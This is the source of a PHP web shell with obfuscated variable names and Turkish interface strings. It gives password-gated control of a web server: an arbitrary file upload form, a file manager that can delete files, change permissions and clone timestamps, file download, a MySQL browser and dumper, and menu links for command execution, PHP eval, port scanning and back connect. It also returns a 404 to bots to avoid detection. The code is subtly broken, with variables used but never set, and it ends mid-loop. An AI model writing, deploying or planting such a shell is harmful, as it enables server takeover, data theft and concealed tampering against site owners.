<?php
echo '[syslog]01
'; function rooting() { echo '<b>Sw Bilgi<br><br>' . php_uname() . '<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if ($_POST['_upl'] == 'Upload') { if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; } else { echo '<b>Basarisiz</b><br><br>'; } } } $sp41000b = $_GET['x']; switch ($sp41000b) { case 'rooting': rooting(); break; } @error_reporting(7); @session_start(); if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') !== false) { header('HTTP/1.0 404 Not Found'); die; } ob_start(); echo '[syslog]02
'; $sp875595 = explode(' ', microtime()); $spd725d3 = $sp875595[1] + $sp875595[0]; define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)) . '/'); define('SELF', $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']); define('IS_WIN', DIRECTORY_SEPARATOR == '\\'); define('IS_GPC', get_magic_quotes_gpc()); $sp239931 = 'true'; define('IS_PHPINFO', !eregi('phpinfo', $sp239931) ? 1 : 0); echo '[syslog]03
'; if (IS_GPC) { $_POST = s_array($_POST); } $sp15d7f5 = $_POST; unset($_POST); $sp7ceca3 = 'ec38fe2a8497e0a8d6d349b3533038cb'; $spcd0068 = ''; $sp3049a2 = ''; $sp63c1d6 = '/'; $sp30b778 = 86400; $spb669c1 = array('big5' => 'big5', 'cp-866' => 'cp866', 'euc-jp' => 'ujis', 'euc-kr' => 'euckr', 'gbk' => 'gbk', 'iso-8859-1' => 'latin1', 'koi8-r' => 'koi8r', 'koi8-u' => 'koi8u', 'utf-8' => 'utf8', 'windows-1252' => 'latin1'); $sp87ccd4 = isset($sp15d7f5['act']) ? $sp15d7f5['act'] : ''; $sp093c94 = isset($sp15d7f5['charset']) ? $sp15d7f5['charset'] : 'gbk'; $sp803287 = isset($sp15d7f5['doing']) ? $sp15d7f5['doing'] : ''; for ($sp412bbc = 1; $sp412bbc <= 4; $sp412bbc++) { ${'p' . $sp412bbc} = isset($sp15d7f5['p' . $sp412bbc]) ? $sp15d7f5['p' . $sp412bbc] : ''; } if (isset($spb669c1[$sp093c94])) { header('content-Type: text/html; charset=' . $sp093c94); } $sp73acdf = time(); if ($sp87ccd4 == 'logout') { scookie('loginpass', '', -86400 * 365); @header('Location: ' . SELF); die; } if ($sp7ceca3) { if ($sp87ccd4 == 'login') { if ($sp7ceca3 == encode_pass($sp15d7f5['password'])) { scookie('loginpass', encode_pass($sp15d7f5['password'])); @header('Location: ' . SELF); die; } } if (isset($_COOKIE['loginpass'])) { if ($_COOKIE['loginpass'] != $sp7ceca3) { loginpage(); } } else { loginpage(); } } $sp5fb3e9 = ''; $spa58ee3 = '&#9650;'; $sp6b3266 = '&#9660;'; !$sp87ccd4 && ($sp87ccd4 = 'file'); $spe8c9c2 = getcwd(); if (isset($sp15d7f5['cwd']) && $sp15d7f5['cwd']) { chdir($sp15d7f5['cwd']); } else { chdir(SA_ROOT); } $sp570d5b = getcwd(); $spfaadc9 = $_SERVER['DOCUMENT_ROOT']; foreach (array('web_cwd', 'cwd', 'home_cwd') as $sp8db113) { if (IS_WIN) { ${$sp8db113} = str_replace('\\', '/', ${$sp8db113}); } if (substr(${$sp8db113}, -1) != '/') { ${$sp8db113} = ${$sp8db113} . '/'; } } if ($sp87ccd4 == 'phpinfo') { if (IS_PHPINFO) { phpinfo(); die; } else { $sp5fb3e9 = 'phpinfo() function has disabled'; } } if (!function_exists('scandir')) { function scandir($sp570d5b) { $spf2bff7 = array(); $spcfdfd7 = opendir($sp570d5b); while ($sp7ff75d = readdir($spcfdfd7)) { $spf2bff7[] = $sp7ff75d; } return $spf2bff7 ? $spf2bff7 : 0; } } if ($sp87ccd4 == 'down') { if (is_file($spd6330d) && is_readable($spd6330d)) { @ob_end_clean(); $sp833676 = pathinfo($spd6330d); if (function_exists('mime_content_type')) { $spa48979 = @mime_content_type($spd6330d); header('Content-Type: ' . $spa48979); } else { header('Content-type: application/x-' . $sp833676['extension']); } header('Content-Disposition: attachment; filename=' . $sp833676['basename']); header('Content-Length: ' . sprintf('%u', @filesize($spd6330d))); @readfile($spd6330d); die; } else { $sp5fb3e9 = 'Can\'t read file'; $sp87ccd4 = 'file'; } } ?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php  echo $sp093c94; ?>
">
<title><?php  echo $sp87ccd4 . ' - ' . $_SERVER['HTTP_HOST']; ?>
</title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input, select{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.red{color:#f00;}
.black{color:#000;}
.green{color:#090;}
.b{font-weight:bold;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#fff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
</style>
<script type="text/javascript">
function checkall(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
        if (e.type == 'checkbox') {
			if (e.name != 'chkall' && e.name != 'saveasfile')
				e.checked = form.chkall.checked;
		}
    }
}
function $(id) {
	return document.getElementById(id);
}
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	g(null,null,'createdir',newdirname);
}
function fileperm(pfile, val){
	var newperm;
	newperm = prompt('Current dir/file:'+pfile+'\nPlease input new permissions:', val);
	if (!newperm) return;
	g(null,null,'fileperm',pfile,newperm);
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Filename:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	g(null,null,'rename',newfilename,oldname);
}
function createfile(){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	g('editfile', null, null, filename);
}
function setdb(dbname) {
	if(!dbname) return;
	$('dbform').tablename.value='';
	$('dbform').doing.value='';
	if ($('dbform').sql_query)
	{
		$('dbform').sql_query.value='';
	}
	$('dbform').submit();
}
function setsort(k) {
	$('dbform').order.value=k;
	$('dbform').submit();
}
function settable(tablename,doing) {
	if(!tablename) return;
	if (doing) {
		$('dbform').doing.value=doing;
	} else {
		$('dbform').doing.value='';
	}
	$('dbform').sql_query.value='';
	$('dbform').tablename.value=tablename;
	$('dbform').submit();
}
function s(act,cwd,p1,p2,p3,p4,charset) {
	if(act != null) $('opform').act.value=act;
	if(cwd != null) $('opform').cwd.value=cwd;
	if(p1 != null) $('opform').p1.value=p1;
	if(p2 != null) $('opform').p2.value=p2;
	if(p3 != null) $('opform').p3.value=p3;
	if(p4 != null) {$('opform').p4.value=p4;}else{$('opform').p4.value='';}
	if(charset != null) $('opform').charset.value=charset;
}
function g(act,cwd,p1,p2,p3,p4,charset) {
	s(act,cwd,p1,p2,p3,p4,charset);
	$('opform').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<?php  formhead(array('name' => 'opform')); makehide('act', $sp87ccd4); makehide('cwd', $sp570d5b); makehide('p1', $spd6330d); makehide('p2', $sp0bd92b); makehide('p3', $sp8f82a5); makehide('p4', $spefeac6); makehide('charset', $sp093c94); formfoot(); if (!function_exists('posix_getegid')) { $sp8b0777 = @get_current_user(); $sped417e = @getmyuid(); $spe9607f = @getmygid(); $sp103103 = '?'; } else { $sped417e = @posix_getpwuid(@posix_geteuid()); $spe9607f = @posix_getgrgid(@posix_getegid()); $sped417e = $sped417e['uid']; $sp8b0777 = $sped417e['name']; $spe9607f = $spe9607f['gid']; $sp103103 = $spe9607f['name']; } ?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><?php  echo @php_uname(); ?>
 / User:<?php  echo $sped417e . ' ( ' . $sp8b0777 . ' ) / Group: ' . $spe9607f . ' ( ' . $sp103103 . ' )'; ?>
</span><?php  echo $_SERVER['HTTP_HOST']; ?>
 (<?php  echo gethostbyname($_SERVER['SERVER_NAME']); ?>
)</td>
	</tr>
	<tr class="alt1">
		<td>
			<span style="float:right;">Charset:
			<?php  makeselect(array('name' => 'charset', 'option' => $spb669c1, 'selected' => $sp093c94, 'onchange' => 'g(null,null,null,null,null,null,this.value);')); ?>
			</span>
			<a href="javascript:g('logout');">Logout</a> | 
			<a href="javascript:g('file',null,'','','','','<?php  echo $sp093c94; ?>
');">File Manager</a> | 
			<a href="javascript:g('mysqladmin',null,'','','','','<?php  echo $sp093c94; ?>
');">MYSQL Manager</a> | 
			<a href="javascript:g('shell',null,'','','','','<?php  echo $sp093c94; ?>
');">Execute Command</a> | 
			<a href="javascript:g('phpenv',null,'','','','','<?php  echo $sp093c94; ?>
');">PHP Variable</a> | 
			<a href="javascript:g('portscan',null,'','','','','<?php  echo $sp093c94; ?>
');">Port Scan</a> | 
			<a href="javascript:g('secinfo',null,'','','','','<?php  echo $sp093c94; ?>
');">Security information</a> | 
			<a href="javascript:g('eval',null,'','','','','<?php  echo $sp093c94; ?>
');">Eval PHP Code</a>
			<?php  if (!IS_WIN) { ?>
 | <a href="javascript:g('backconnect',null,'','','','','<?php  echo $sp093c94; ?>
');">Back Connect</a><?php  } ?>
		</td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php  $sp5fb3e9 && m($sp5fb3e9); if ($sp87ccd4 == 'file') { $spbe1491 = @is_writable($sp570d5b) ? 'Writable' : 'Non-writable'; if (isset($spd6330d)) { switch ($spd6330d) { case 'createdir': if ($sp0bd92b) { m('Directory created ' . (@mkdir($sp570d5b . $sp0bd92b, 511) ? 'success' : 'failed')); } break; case 'uploadFile': m('File upload ' . (@move_uploaded_file($_FILES['uploadfile']['tmp_name'], $sp570d5b . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed')); break; case 'fileperm': if ($sp0bd92b && $sp8f82a5) { $sp8f82a5 = base_convert($sp8f82a5, 8, 10); m('Set file permissions ' . (@chmod($sp0bd92b, $sp8f82a5) ? 'success' : 'failed')); } break; case 'rename': if ($sp0bd92b && $sp8f82a5) { m($sp8f82a5 . ' renamed ' . $sp0bd92b . (@rename($sp8f82a5, $sp0bd92b) ? ' success' : ' failed')); } break; case 'clonetime': if ($sp0bd92b && $sp8f82a5) { $spb8a5bd = @filemtime($sp8f82a5); m('Set file last modified ' . (@touch($sp0bd92b, $spb8a5bd, $spb8a5bd) ? 'success' : 'failed')); } break; case 'settime': if ($sp0bd92b && $sp8f82a5) { $spb8a5bd = strtotime($sp8f82a5); m('Set file last modified ' . (@touch($sp0bd92b, $spb8a5bd, $spb8a5bd) ? 'success' : 'failed')); } break; case 'delete': if ($sp15d7f5['dl']) { $sp72611d = $sp4ca00d = 0; foreach ($sp15d7f5['dl'] as $sp1b2b3c) { if (is_dir($sp570d5b . $sp1b2b3c)) { if (@deltree($sp570d5b . $sp1b2b3c)) { $sp72611d++; } else { $sp4ca00d++; } } else { if (@unlink($sp570d5b . $sp1b2b3c)) { $sp72611d++; } else { $sp4ca00d++; } } } m('Deleted folder/file(s) have finished, choose ' . count($sp15d7f5['dl']) . ', success ' . $sp72611d . ', fail ' . $sp4ca00d); } else { m('Please select folder/file(s)'); echo '[syslog]04_f
'; } break; case 'paste': if ($_SESSION['do'] == 'copy') { foreach ($_SESSION['dl'] as $sp1b2b3c) { copy_paste($_SESSION['c'], $sp1b2b3c, $sp570d5b); } } elseif ($_SESSION['do'] == 'move') { foreach ($_SESSION['dl'] as $sp1b2b3c) { @rename($_SESSION['c'] . $sp1b2b3c, $sp570d5b . $sp1b2b3c); } } unset($_SESSION['do'], $_SESSION['dl'], $_SESSION['c']); break; default: if ($spd6330d == 'copy' || $spd6330d == 'move') { if (isset($sp15d7f5['dl']) && count($sp15d7f5['dl'])) { $_SESSION['do'] = $spd6330d; $_SESSION['dl'] = $sp15d7f5['dl']; $_SESSION['c'] = $sp15d7f5['cwd']; m('Have been copied to the session'); } else { m('Please select folder/file(s)'); } } break; } echo '<script type="text/javascript">$(\'opform\').p1.value=\'\';$(\'opform\').p2.value=\'\';</script>'; } $spa94bfd = @disk_free_space($sp570d5b); !$spa94bfd && ($spa94bfd = 0); $spaf9d6a = @disk_total_space($sp570d5b); !$spaf9d6a && ($spaf9d6a = 0); $spf6d887 = $spaf9d6a - $spa94bfd; p('<h2>File Manager - Current disk free ' . sizecount($spa94bfd) . ' of ' . sizecount($spaf9d6a) . ' (' . @round(100 / ($spaf9d6a / $spa94bfd), 2) . '%)</h2>'); $sp405fcc = ''; $sp149c6d = explode('/', $sp570d5b); $sp5c3411 = count($sp149c6d); for ($sp412bbc = 0; $sp412bbc < $sp5c3411 - 1; $sp412bbc++) { $sp405fcc .= '<a href="javascript:g(\'file\', \''; for ($sp460372 = 0; $sp460372 <= $sp412bbc; $sp460372++) { $sp405fcc .= $sp149c6d[$sp460372] . '/'; } $sp405fcc .= '\');">' . $sp149c6d[$sp412bbc] . '/</a>'; } ?>
<script type="text/javascript">
document.onclick = shownav;
function shownav(e){
	var src = e?e.target:event.srcElement;
	do{
		if(src.id =="jumpto") {
			$('inputnav').style.display = "";
			$('pathnav').style.display = "none";
			return;
		}
		if(src.id =="inputnav") {
			return;
		}
		src = src.parentNode;
	}while(src.parentNode)

	$('inputnav').style.display = "none";
	$('pathnav').style.display = "";
}
</script>
<div style="background:#eee;margin-bottom:10px;">
	<form onsubmit="g('file',this.cwd.value);return false;" method="POST" id="godir" name="godir">
		<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
			<tr>
				<td width="100%"><?php  echo $sp405fcc . ' - ' . getChmod($sp570d5b) . ' / ' . PermsColor($sp570d5b) . getUser($sp570d5b); ?>
 (<?php  echo $spbe1491; ?>
)</td>
				<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
			</tr>
		</table>
		<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
			<tr>
				<td nowrap>Current Directory (<?php  echo $spbe1491; ?>
, <?php  echo getChmod($sp570d5b); ?>
)</td>
				<td width="100%"><input class="input" name="cwd" value="<?php  echo $sp570d5b; ?>
" type="text" style="width:99%;margin:0 8px;"></td>
				<td nowrap><input class="bt" value="GO" type="submit"></td>
			</tr>
		</table>
	</form>
<?php  if (IS_WIN) { $spf405dc = ''; p('<div class="drives">'); foreach (range('A', 'Z') as $sp9378fb) { if (is_dir($sp9378fb . ':/')) { p($spf405dc . '<a href="javascript:g(\'file\', \'' . $sp9378fb . ':/\');">' . $sp9378fb . ':\\</a>'); $spf405dc = '<span>|</span>'; } } p('</div>'); } ?>
</div>
<?php  p('<table width="100%" border="0" cellpadding="4" cellspacing="0">'); p('<tr class="alt1"><td colspan="6" style="padding:5px;line-height:20px;">'); p('<form action="' . SELF . '" method="POST" enctype="multipart/form-data"><div style="float:right;"><input name="uploadfile" value="" type="file" /> <input class="bt" value="Upload" type="submit" /><input name="charset" value="' . $sp093c94 . '" type="hidden" /><input type="hidden" name="p1" value="uploadFile"><input name="cwd" value="' . $sp570d5b . '" type="hidden" /></div></form>'); p('<a href="javascript:g(\'file\', \'' . str_replace('\\', '/', $spfaadc9) . '\');">WebRoot</a>'); p(' | <a href="javascript:g(\'file\', \'' . $spe8c9c2 . '\');">ScriptPath</a>'); p(' | <a href="javascript:g(\'file\',\'' . $sp570d5b . '\',null,null,null,\'dir\');">View Writable Directory</a> '); p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile();">Create File</a>'); p('</td></tr>'); $spbc4c0f = array('filename', 1); if ($spd6330d) { if (preg_match('!s_([A-z_]+)_(\\d{1})!', $spd6330d, $spd3b0e2)) { $spbc4c0f = array($spd3b0e2[1], (int) $spd3b0e2[2]); } } formhead(array('name' => 'flist')); makehide('act', 'file'); makehide('p1', ''); makehide('cwd', $sp570d5b); makehide('charset', $sp093c94); p('<tr class="head">'); p('<td width="2%" nowrap><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>'); p('<td><a href="javascript:g(\'file\',null,\'s_filename_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Filename</a> ' . ($spd6330d == 's_filename_0' ? $sp6b3266 : '') . ($spd6330d == 's_filename_1' || !$spd6330d ? $spa58ee3 : '') . '</td>'); p('<td width="16%"><a href="javascript:g(\'file\',null,\'s_mtime_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Last modified</a> ' . ($spd6330d == 's_mtime_0' ? $sp6b3266 : '') . ($spd6330d == 's_mtime_1' ? $spa58ee3 : '') . '</td>'); p('<td width="10%"><a href="javascript:g(\'file\',null,\'s_size_' . ($spbc4c0f[1] ? 0 : 1) . '\');">Size</a> ' . ($spd6330d == 's_size_0' ? $sp6b3266 : '') . ($spd6330d == 's_size_1' ? $spa58ee3 : '') . '</td>'); p('<td width="20%">Chmod / Perms</td>'); p('<td width="22%">Action</td>'); p('</tr>'); $spbf846d = $spf393a1 = array(); if ($spefeac6 == 'dir') { $spbf846d = GetWDirList($sp570d5b); $spf393a1 = array(); } else { $sp495c2d = @scandir($sp570d5b); if ($sp495c2d) { $sp495c2d = array_diff($sp495c2d, array('.')); foreach ($sp495c2d as $sp7ff75d) { $sp256f71 = $sp570d5b . $sp7ff75d; if (@is_dir($sp256f71)) { $sp1be5fd['filename'] = $sp7ff75d; $sp1be5fd['mtime'] = @date('Y-m-d H:i:s', filemtime($sp256f71)); $sp1be5fd['chmod'] = getChmod($sp256f71); $sp1be5fd['perm'] = PermsColor($sp256f71); $sp1be5fd['owner'] = getUser($sp256f71); $sp1be5fd['link'] = $sp256f71; if ($sp7ff75d == '..') { $spbf846d['up'] = 1; } else { $spbf846d[] = $sp1be5fd; } } else { $spa5a01d['filename'] = $sp7ff75d; $spa5a01d['size'] = sprintf('%u', @filesize($sp256f71)); $spa5a01d['mtime'] = @date('Y-m-d H:i:s', filemtime($sp256f71)); $spa5a01d['chmod'] = getChmod($sp256f71); $spa5a01d['perm'] = PermsColor($sp256f71); $spa5a01d['owner'] = getUser($sp256f71); $spa5a01d['link'] = $sp256f71; $spf393a1[] = $spa5a01d; } } unset($sp1be5fd); unset($spa5a01d); } } $sp9c8ee2 = '0'; if (isset($spbf846d['up'])) { $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:g(\'file\',\'' . getUpPath($sp570d5b) . '\');">Parent Directory</a></td>'); p('</tr>'); } unset($spbf846d['up']); usort($spbf846d, 'cmp'); usort($spf393a1, 'cmp'); foreach ($spbf846d as $sp7ac89e => $sp1be5fd) { if ($spd6330d == 'getsize' && $sp0bd92b == $sp1be5fd['filename']) { $spf58391 = dirsize($sp0bd92b); $spf58391 = is_numeric($spf58391) ? sizecount($spf58391) : 'Unknown'; } else { $spf58391 = '<a href="javascript:g(\'file\', null, \'getsize\', \'' . $sp1be5fd['filename'] . '\');">Stat</a>'; } $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $sp1be5fd['filename'] . '"></td>'); p('<td><a href="javascript:g(\'file\',\'' . $sp1be5fd['link'] . '\')">' . $sp1be5fd['filename'] . '</a></td>'); p('<td nowrap><a href="javascript:g(\'newtime\',null,\'' . $sp1be5fd['filename'] . '\');">' . $sp1be5fd['mtime'] . '</a></td>'); p('<td nowrap>' . $spf58391 . '</td>'); p('<td nowrap>'); p('<a href="javascript:fileperm(\'' . $sp1be5fd['filename'] . '\', \'' . $sp1be5fd['chmod'] . '\');">' . $sp1be5fd['chmod'] . '</a> / '); p('<a href="javascript:fileperm(\'' . $sp1be5fd['filename'] . '\', \'' . $sp1be5fd['chmod'] . '\');">' . $sp1be5fd['perm'] . '</a>' . $sp1be5fd['owner'] . '</td>'); p('<td nowrap><a href="javascript:rename(\'' . $sp1be5fd['filename'] . '\');">Rename</a></td>'); p('</tr>'); $sp9c8ee2++; } p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>'); $spd9960c = '0'; foreach ($spf393a1 as $sp7ac89e => $spa5a01d) { $sp006042 = '/' . str_replace($spfaadc9, '', $spa5a01d['link']); $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="' . $spa5a01d['filename'] . '"></td>'); p('<td>' . (strpos($spa5a01d['link'], $spfaadc9) !== false ? '<a href="' . $sp006042 . '" target="_blank">' . $spa5a01d['filename'] . '</a>' : $spa5a01d['filename']) . '</td>'); p('<td nowrap><a href="javascript:g(\'newtime\',null,\'' . $spa5a01d['filename'] . '\');">' . $spa5a01d['mtime'] . '</a></td>'); p('<td nowrap>' . sizecount($spa5a01d['size']) . '</td>'); p('<td nowrap>'); p('<a href="javascript:fileperm(\'' . $spa5a01d['filename'] . '\', \'' . $spa5a01d['chmod'] . '\');">' . $spa5a01d['chmod'] . '</a> / '); p('<a href="javascript:fileperm(\'' . $spa5a01d['filename'] . '\', \'' . $spa5a01d['chmod'] . '\');">' . $spa5a01d['perm'] . '</a>' . $spa5a01d['owner'] . '</td>'); p('<td nowrap>'); p('<a href="javascript:g(\'down\',null,\'' . $spa5a01d['filename'] . '\');">Down</a> | '); p('<a href="javascript:g(\'editfile\',null,null,\'' . $spa5a01d['filename'] . '\');">Edit</a> | '); p('<a href="javascript:rename(\'' . $spa5a01d['filename'] . '\');">Rename</a>'); p('</td></tr>'); $spd9960c++; } p('<tr class="' . bg() . ' head"><td colspan="5"><a href="#" onclick="$(\'flist\').p1.value=\'delete\';$(\'flist\').submit();">Delete</a> | <a href="#" onclick="$(\'flist\').p1.value=\'copy\';$(\'flist\').submit();">Copy</a> | <a href="#" onclick="$(\'flist\').p1.value=\'move\';$(\'flist\').submit();">Move</a>' . (isset($_SESSION['do']) && @count($_SESSION['dl']) ? ' | <a href="#" onclick="$(\'flist\').p1.value=\'paste\';$(\'flist\').submit();">Paste</a>' : '') . '</td><td align="right">' . $sp9c8ee2 . ' directories / ' . $spd9960c . ' files</td></tr>'); p('</form></table>'); } elseif ($sp87ccd4 == 'mysqladmin') { $sp7fd26f = isset($sp15d7f5['order']) ? $sp15d7f5['order'] : ''; $sp342aef = isset($sp15d7f5['dbhost']) ? $sp15d7f5['dbhost'] : ''; $spe1f996 = isset($sp15d7f5['dbuser']) ? $sp15d7f5['dbuser'] : ''; $spc9e959 = isset($sp15d7f5['dbpass']) ? $sp15d7f5['dbpass'] : ''; $sp50c961 = isset($sp15d7f5['dbname']) ? $sp15d7f5['dbname'] : ''; $sp397cb0 = isset($sp15d7f5['tablename']) ? $sp15d7f5['tablename'] : ''; if ($sp803287 == 'dump') { if (isset($sp15d7f5['bak_table']) && $sp15d7f5['bak_table']) { $spfd836c = new DB_MySQL(); $spfd836c->charsetdb = $spb669c1; $spfd836c->charset = $sp093c94; $spfd836c->connect($sp342aef, $spe1f996, $spc9e959, $sp50c961); if ($sp15d7f5['saveasfile'] && $sp15d7f5['bak_path']) { $spe0ea16 = @fopen($sp15d7f5['bak_path'], 'w'); if ($spe0ea16) { foreach ($sp15d7f5['bak_table'] as $sp8db113 => $sp6d4391) { if ($sp6d4391) { $spfd836c->sqldump($sp6d4391, $spe0ea16); } } fclose($spe0ea16); $sp006042 = str_replace(SA_ROOT, '', $sp15d7f5['bak_path']); m('Database has backup to <a href="' . $sp006042 . '" target="_blank">' . $sp15d7f5['bak_path'] . '</a>'); } else { m('Backup failed'); } } else { @ob_end_clean(); $spcc5ae4 = basename($sp50c961 . '.sql'); header('Content-type: application/unknown'); header('Content-Disposition: attachment; filename=' . $spcc5ae4); foreach ($sp15d7f5['bak_table'] as $sp8db113 => $sp6d4391) { if ($sp6d4391) { $spfd836c->sqldump($sp6d4391); } } die; } $spfd836c->close(); } else { m('Please choose the table'); } $sp803287 = ''; } formhead(array('title' => 'MYSQL Manager', 'name' => 'dbform')); makehide('act', 'mysqladmin'); makehide('doing', $sp803287); makehide('charset', $sp093c94); makehide('tablename', $sp397cb0); makehide('order', $sp7fd26f); p('<p>'); p('DBHost:'); makeinput(array('name' => 'dbhost', 'size' => 20, 'value' => $sp342aef)); p('DBUser:'); makeinput(array('name' => 'dbuser', 'size' => 15, 'value' => $spe1f996)); p('DBPass:'); makeinput(array('name' => 'dbpass', 'size' => 15, 'value' => $spc9e959)); makeinput(array('value' => 'Connect', 'type' => 'submit', 'class' => 'bt')); p('</p>'); if ($sp342aef && $spe1f996 && isset($spc9e959)) { $spfd836c = new DB_MySQL(); $spfd836c->charsetdb = $spb669c1; $spfd836c->charset = $sp093c94; $spfd836c->connect($sp342aef, $spe1f996, $spc9e959, $sp50c961); p('<p class="red">MySQL ' . $spfd836c->version() . ' running in ' . $sp342aef . ' as ' . $spe1f996 . '@' . $sp342aef . '</p>'); $sp7550a2 = $spfd836c->version() > '4.1' ? 1 : 0; $sp8cac4d = $spfd836c->query('SHOW DATABASES'); $spef7743 = array(); $spef7743[] = '-- Select a database --'; while ($sp95ae53 = $spfd836c->fetch($sp8cac4d)) { $spef7743[$sp95ae53['Database']] = $sp95ae53['Database']; } makeselect(array('name' => 'dbname', 'option' => $spef7743, 'selected' => $sp50c961, 'onchange' => 'setdb(this.options[this.selectedIndex].value)')); echo '[syslog]05_f
'; if ($sp50c961) { p('<p>Current dababase: <a href="javascript:setdb(\'' . $sp50c961 . '\');">' . $sp50c961 . '</a>'); if ($sp397cb0) { p(' | Current Table: <a href="javascript:settable(\'' . $sp397cb0 . '\');">' . $sp397cb0 . '</a> [ <a href="javascript:settable(\'' . $sp397cb0 . '\', \'structure\');">Structure</a> ]'); } p('</p>'); $spe252e2 = isset($sp15d7f5['sql_query']) ? $sp15d7f5['sql_query'] : ''; if ($sp397cb0 && !$spe252e2) { $spe252e2 = "SELECT * FROM {$sp397cb0} LIMIT 0, 30"; } if ($sp397cb0 && $sp803287 == 'structure') { $spe252e2 = "SHOW FULL COLUMNS FROM {$sp397cb0};\n"; $spe252e2 .= "SHOW INDEX FROM {$sp397cb0};"; } p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database ' . $sp50c961 . ':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">' . htmlspecialchars($spe252e2, ENT_QUOTES) . '</textarea></td><td style="padding:0 5px;"><input class="bt" onclick="$(\'doing\').value=\'\'" style="height:50px;" type="submit" value="Query" /></td></tr></table></p>'); if ($spe252e2) { $spebd6e4 = @explode(';', $spe252e2); foreach ($spebd6e4 as $sp6cf735 => $sp8cac4d) { if ($sp8cac4d) { p("<p class=\"red b\">Query#{$sp6cf735} : " . htmlspecialchars($sp8cac4d, ENT_QUOTES) . '</p>'); switch ($spfd836c->query_res($sp8cac4d)) { case 0: p('<h2>' . $spfd836c->halt('Error') . '</h2>'); break; case 1: $spb7d120 = $spfd836c->query($sp8cac4d); $sp4e6a5f = $spfd836c->num_rows($spb7d120); p('<table border="0" cellpadding="3" cellspacing="0">'); p('<tr class="head">'); $sp18eeff = @mysql_num_fields($spb7d120); for ($sp412bbc = 0; $sp412bbc < $sp18eeff; $sp412bbc++) { p('<td nowrap>' . @mysql_field_name($spb7d120, $sp412bbc) . '</td>'); } p('</tr>'); if (!$sp4e6a5f) { p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"><td nowrap colspan="' . $sp18eeff . '" class="red b">No records</td></tr>'); } else { while ($spca873d = $spfd836c->fetch($spb7d120)) { $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); foreach ($spca873d as $sp7ac89e => $spdec8d4) { p('<td nowrap>' . ($spdec8d4 == null ? '<i>null</i>' : html_clean($spdec8d4)) . '</td>'); } p('</tr>'); unset($spe7e5f0); } } p('</table>'); break; case 2: p('<h2>Affected Rows : ' . $spfd836c->affected_rows() . '</h2>'); break; } } } } else { $sp8cac4d = $spfd836c->query('SHOW TABLE STATUS'); $spfcd1ca = $sp7460c5 = $sp6c8724 = 0; $sp8b3c02 = array(); while ($sp110772 = $spfd836c->fetch($sp8cac4d)) { $sp6c8724 = $sp6c8724 + $sp110772['Data_length']; $sp7460c5 = $sp7460c5 + $sp110772['Rows']; 